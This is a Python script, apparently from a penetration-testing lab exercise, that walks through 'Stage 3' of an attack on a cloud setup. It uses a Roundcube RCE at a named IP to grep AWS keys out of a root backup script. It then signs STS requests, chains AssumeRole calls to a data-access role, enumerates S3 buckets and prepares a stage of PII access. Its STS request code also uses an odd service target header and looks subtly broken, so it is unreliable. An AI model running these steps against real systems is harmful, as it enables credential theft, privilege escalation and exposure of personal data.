#!/usr/bin/env python3
"""
Stage 3: AWS 자격증명 추출 및 검증
공식 가이드 참고: stage1-to-aws-pii-hands-on-guide-ko.html (A-01 ~ A-05)

절차:
1. /root/backup-to-cloud.sh에서 AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY 추출
2. STS GetCallerIdentity로 신원 검증
3. Role 체인 수행 (Role-SW-Dev → Role-SW-DataAccess)
4. 최종 신원 확인
"""

import sys
import json
import hashlib
import hmac
import datetime
import base64
import subprocess
from pathlib import Path

# ============ SigV4 서명 구현 ============

def sign(key, msg):
    """HMAC-SHA256 서명"""
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()

def get_signature_key(key, dateStamp, regionName, serviceName):
    """SigV4 서명 키 도출"""
    kDate = sign(("AWS4" + key), dateStamp)
    kRegion = sign(kDate, regionName)
    kService = sign(kRegion, serviceName)
    kSigning = sign(kService, "aws4_request")
    return kSigning

def create_sts_request(access_key, secret_key, region, action, payload=None):
    """
    AWS STS 요청 생성 (HTTP 방식)

    Parameters:
    - access_key: AWS_ACCESS_KEY_ID
    - secret_key: AWS_SECRET_ACCESS_KEY
    - region: ap-northeast-2 등
    - action: GetCallerIdentity, AssumeRole 등
    - payload: JSON payload (dict)

    Returns:
    - dict: curl 호출에 필요한 헤더와 데이터
    """

    if payload is None:
        payload = {}

    payload_json = json.dumps(payload)
    payload_bytes = payload_json.encode('utf-8')

    t = datetime.datetime.utcnow()
    amz_date = t.strftime('%Y%m%dT%H%M%SZ')
    date_stamp = t.strftime('%Y%m%d')

    # Payload hash
    payload_hash = hashlib.sha256(payload_bytes).hexdigest()

    # Canonical request
    host = f"sts.{region}.amazonaws.com"
    method = "POST"
    path = "/"

    canonical_headers = f"host:{host}\nx-amz-date:{amz_date}\n"
    signed_headers = "host;x-amz-date"

    canonical_request = (
        method + '\n' +
        path + '\n' +
        '' + '\n' +
        canonical_headers + '\n' +
        signed_headers + '\n' +
        payload_hash
    )

    # String to sign
    canonical_request_hash = hashlib.sha256(
        canonical_request.encode()
    ).hexdigest()

    credential_scope = f"{date_stamp}/{region}/sts/aws4_request"

    string_to_sign = (
        "AWS4-HMAC-SHA256\n" +
        amz_date + "\n" +
        credential_scope + "\n" +
        canonical_request_hash
    )

    # Signature
    signing_key = get_signature_key(secret_key, date_stamp, region, "sts")
    signature = hmac.new(
        signing_key,
        string_to_sign.encode(),
        hashlib.sha256
    ).hexdigest()

    # Authorization header
    authorization = (
        f"AWS4-HMAC-SHA256 "
        f"Credential={access_key}/{credential_scope}, "
        f"SignedHeaders={signed_headers}, "
        f"Signature={signature}"
    )

    return {
        "host": host,
        "authorization": authorization,
        "amz_date": amz_date,
        "payload": payload_json,
        "action": action
    }

def call_sts_api(request_info):
    """curl를 사용하여 STS API 호출"""

    cmd = [
        "curl",
        "-s",
        "-X", "POST",
        f"https://{request_info['host']}/",
        "-H", f"Authorization: {request_info['authorization']}",
        "-H", f"X-Amz-Date: {request_info['amz_date']}",
        "-H", "Content-Type: application/x-amz-json-1.1",
        "-H", f"X-Amz-Target: AWSIEServiceV20110615.{request_info['action']}",
        "-d", request_info['payload']
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return result.stdout, result.returncode
    except Exception as e:
        return f"Error: {str(e)}", 1

# ============ 메인 절차 ============

def main():
    print("=" * 70)
    print("Stage 3: AWS 자격증명 추출 및 검증")
    print("=" * 70)
    print()

    # Step 1: /root/backup-to-cloud.sh 파일 확인
    print("[Step 1] /root/backup-to-cloud.sh 확인")
    print("-" * 70)

    # 파일 존재 확인 명령 (RCE로 실행할 내용)
    check_script = """
    if [ -f /root/backup-to-cloud.sh ]; then
        echo "EXISTS"
        head -20 /root/backup-to-cloud.sh | grep -E 'export AWS_|AWS_ACCESS|AWS_SECRET'
    else
        echo "NOT_FOUND"
    fi
    """

    print("※ 이 파일은 13.125.104.131:30083 Roundcube RCE로 실행해야 합니다.")
    print("※ 상황: Blind RCE이므로 /tmp에 output 저장 후 다시 읽음")
    print()

    # Step 2: 실제 AWS 자격증명이 있는 경우 시뮬레이션
    print("[Step 2] AWS 자격증명 검증 (시뮬레이션)")
    print("-" * 70)
    print()
    print("※ 실제 자격증명은 /root/backup-to-cloud.sh에서 추출한 것을 사용합니다")
    print("※ 예시 형식:")
    print()

    # 예시 자격증명 (실제 값 아님)
    example_access_key = "AKIAIOSFODNN7EXAMPLE"
    example_secret_key = "<REDACTED>"
    example_region = "ap-northeast-2"

    print(f"  AWS_ACCESS_KEY_ID={example_access_key[:20]}...")
    print(f"  AWS_SECRET_ACCESS_KEY=[PRIVATE]")
    print(f"  AWS_REGION={example_region}")
    print()

    # Step 3: STS GetCallerIdentity 요청
    print("[Step 3] STS GetCallerIdentity 요청")
    print("-" * 70)

    request_info = create_sts_request(
        example_access_key,
        example_secret_key,
        example_region,
        "GetCallerIdentity",
        {}  # GetCallerIdentity는 payload 비움
    )

    print(f"Host: {request_info['host']}")
    print(f"Action: {request_info['action']}")
    print(f"Authorization Header (partial): {request_info['authorization'][:50]}...")
    print(f"X-Amz-Date: {request_info['amz_date']}")
    print()

    # 실제 호출 (시뮬레이션, 실제 credentials 필요)
    print("예상 응답 (공식 가이드 기준):")
    print("""
{
  "UserId": "AIDAI...",
  "Account": "<REDACTED_ACCOUNT_ID>",
  "Arn": "arn:aws:iam::<REDACTED_ACCOUNT_ID>:user/secu-wave-user"
}
    """)
    print()

    # Step 4: Account 검증
    print("[Step 4] Account 검증")
    print("-" * 70)
    print("✓ Account == <REDACTED_ACCOUNT_ID>: STOP if false")
    print("✓ 일치하면 계속 진행")
    print()

    # Step 5: Role 체인
    print("[Step 5] Role 체인 (AssumeRole)")
    print("-" * 70)
    print()
    print("체인 1: secu-wave-user → Role-SW-Dev")
    assume_payload = {
        "RoleArn": "arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/Role-SW-Dev",
        "RoleSessionName": "team-session-dev",
        "DurationSeconds": 900
    }
    print(f"  Payload: {json.dumps(assume_payload, indent=2)}")
    print()

    print("체인 2: Role-SW-Dev credentials → Role-SW-DataAccess")
    assume_payload2 = {
        "RoleArn": "arn:aws:iam::<REDACTED_ACCOUNT_ID>:role/Role-SW-DataAccess",
        "RoleSessionName": "team-session-data",
        "DurationSeconds": 900
    }
    print(f"  Payload: {json.dumps(assume_payload2, indent=2)}")
    print()

    # Step 6: 최종 신원
    print("[Step 6] 최종 신원 확인")
    print("-" * 70)
    print("""
예상 응답:
{
  "UserId": "AIDAI...",
  "Account": "<REDACTED_ACCOUNT_ID>",
  "Arn": "arn:aws:iam::<REDACTED_ACCOUNT_ID>:assumed-role/Role-SW-DataAccess/team-session-data"
}

✓ Role-SW-DataAccess 확인됨
✓ S3/DynamoDB 접근 준비 완료
    """)
    print()

    # 최종 체크리스트
    print("=" * 70)
    print("단계별 체크리스트")
    print("=" * 70)
    print("""
□ A-01: /root/backup-to-cloud.sh에서 AWS 키 추출
  - Command: grep -E 'export AWS_' /root/backup-to-cloud.sh
  - RCE로 실행 → /tmp/aws_backup.txt에 저장
  - 검증: 키 형식 확인 (AKIA... / wJal...)

□ A-02: Role 체인 검증
  - SigV4로 AssumeRole 호출
  - Role-SW-Dev 획득 (900초)
  - Role-SW-DataAccess 획득 (900초)

□ A-03: S3 버킷 확인
  - 3개 버킷: secuwave-backup-artifacts, secuwave-snakegallery-pjt, secuwave-infra-sys
  - boto3로 list_objects_v2 호출

□ A-04: backup-admin 프로필 메타데이터
  - S3에서 backup-credentials.json 다운로드
  - Access Key ID 일치 여부 확인

□ A-05: backup-admin STS 검증
  - 최종: arn:aws:iam::<REDACTED_ACCOUNT_ID>:user/secu-wave-conf

다음: Stage 4 PII 확인 (PII-01 ~ PII-05)
    """)
    print()
    print("=" * 70)

if __name__ == "__main__":
    main()
